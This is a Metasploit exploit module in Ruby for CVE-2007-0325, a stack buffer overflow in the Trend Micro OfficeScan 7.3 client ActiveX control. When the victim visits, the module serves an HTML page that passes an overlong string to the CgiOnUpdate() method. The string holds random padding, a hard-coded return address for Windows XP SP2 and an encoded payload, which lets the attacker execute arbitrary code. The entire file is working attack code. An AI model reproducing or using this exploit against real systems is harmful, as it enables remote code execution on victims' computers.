##
# $Id: trendmicro_officescan.rb 5100 2007-09-10 01:01:20Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'

module Msf

class Exploits::Windows::Browser::Trendmicro_Officescan < Msf::Exploit::Remote

	include Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Trend Micro OfficeScan Client ActiveX Control Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack overflow in Trend Micro OfficeScan 
					Corporate Edition 7.3. By sending an overly long string to the 
					"CgiOnUpdate()" method located in the OfficeScanSetupINI.dll Control,  
					an attacker may be able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ], 
			'Version'        => '$Revision: 5100 $',
			'References'     => 
				[
					[ 'CVE', '2007-0325' ],
					[ 'BID', '22585' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 800,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'PrepenEncoder' => "\x81\xc4\x54\xf2\xff\xff",	
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP2 Pro English',     { 'Ret' => 0x7cc58fd8 } ],
				],
			'DisclosureDate' => 'Feb 12 2007',
			'DefaultTarget'  => 0))
	end

	def autofilter
			false
	end

	def check_dependencies
			use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Randomize some things
		vname	= rand_text_alpha(rand(100) + 1)
		strname	= rand_text_alpha(rand(100) + 1)
		
		# Set the exploit buffer	
		sploit =  rand_text_alpha(2149) + [target.ret].pack('V') + p.encoded 
		
		# Build out the message
		content = %Q|
			<html>
			<object classid='clsid:08d75bb0-d2b5-11d1-88fc-0080c859833b' id='#{vname}'></object>
			<script language='javascript'>
			var #{vname} = document.getElementById('#{vname}');
			var #{strname} = new String('#{sploit}');
			#{vname}.CgiOnUpdate = #{strname};	
			</script>
			</html>
                  |
		
		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)
		
		# Handle the payload
		handler(cli)
	end

end
end
